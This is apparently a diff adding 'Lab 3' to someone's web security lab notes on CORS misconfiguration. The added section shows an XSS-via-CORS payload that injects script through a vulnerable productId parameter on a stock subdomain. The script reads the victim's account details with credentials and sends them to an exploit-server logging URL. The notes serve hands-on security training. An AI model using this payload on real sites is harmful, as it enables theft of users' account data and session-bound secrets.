@@ -79,3 +79,24 @@ iframe will make the browser to set the Origin value to null while make the Orig
 "></iframe>
 ```
 sandbox = allow-scripts ::: allows iframe to run js.
+
+### Lab 3
+
+executing xss using CORS
+
+
+first find the xss vulnerable endpoint that is in **```stock```** subdomain, in the productId value it is vulnerable to xss.
+
+```
+<script>
+    document.location="http://stock.0abb0047045d9364821b51c2007400d4.web-security-academy.net/?productId=4
+    <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener; 
+    req.open('get','https://0abb0047045d9364821b51c2007400d4.web-security-academy.net/accountDetails',true); 
+    req.withCredentials = true;
+    req.send();
+    function reqListener() 
+    {location='https://exploit-0a7b001b046893fe820850c101060085.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
